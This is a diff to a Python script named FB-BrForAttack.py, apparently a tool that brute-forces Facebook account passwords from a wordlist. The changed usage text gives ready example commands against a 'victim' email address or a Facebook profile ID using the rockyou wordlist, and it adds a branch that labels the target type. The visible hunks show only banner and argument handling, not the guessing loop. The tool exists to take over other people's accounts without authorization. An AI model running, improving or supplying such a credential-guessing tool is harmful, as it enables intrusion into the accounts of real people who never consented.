@@ -23,15 +23,23 @@ def check():                                      #
 check = check()                                   #
 ###################################################
 
-parse = optparse.OptionParser("""\nUsage: python ./FB-BrForAttack.py -T [TARGET]<Email/ID> -W <Wordlist file>
-
+parse = optparse.OptionParser("""
+Usage: python ./FB-BrForAttack.py -T [TARGET]<Email/ID> -W <Wordlist file>
+-------------
 OPTIONS:
-        -t <target email> [OR] <FACEBOOK ID>        ::>   Set target Email [OR] Target Profile ID
-        -w <word list file>                         ::>   Set Wordlist File 
-
-Example:
-        ./FB-BrForAttack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
-	./FB-BrForAttack.py -t 100001013078780 -w /usr/share/wordlists/rockyou.txt
+       |
+    |--------    
+    | -t <target email> [OR] <FACEBOOK ID>        ::>   Set target Email [OR] Target Profile ID
+    |--------
+    | -w <word list file>                         ::>   Set Wordlist File 
+-------------
+Examples:
+        |
+     |--------
+     | python FB-BrForAttack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     |--------
+     | python FB-BrForAttack.py -t 100001013078780 -w C:\Users\Me\Desktop\wordlist.txt
+     |--------
 
 """)
 def Main():
@@ -40,6 +48,7 @@ def Main():
    parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
 			help="wordlist file !")
    (options,args) = parse.parse_args()
+
    if options.taremail !=None and options.wlst !=None: 
      user = options.taremail
      passw = options.wlst
@@ -54,7 +63,10 @@ def Main():
          time.sleep(0.10)
          print("\n[*] website>: www.facebook.com ")
          time.sleep(0.10)
-         print("\n[+] Target Email>: "+str(user))
+         if "@" in user:
+          print("\n[+] Target Email>: "+str(user))
+         else:
+             print("\n[+] Target FB~ID>: "+str(user))
          time.sleep(0.10)
          print("\n[@] WordList>: "+str(passw))
          time.sleep(0.10)
@@ -87,12 +99,14 @@ def Main():
                  print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
                  time.sleep(1.2)
                  exit(1)
+			
      elif check == False:
          print("\n[!] Error: Please Check Your Internet Connection !!!")
          exit(1)
    else:
        print(parse.usage)
        exit(1)
+	
 if __name__=='__main__':
 	Main()
 	
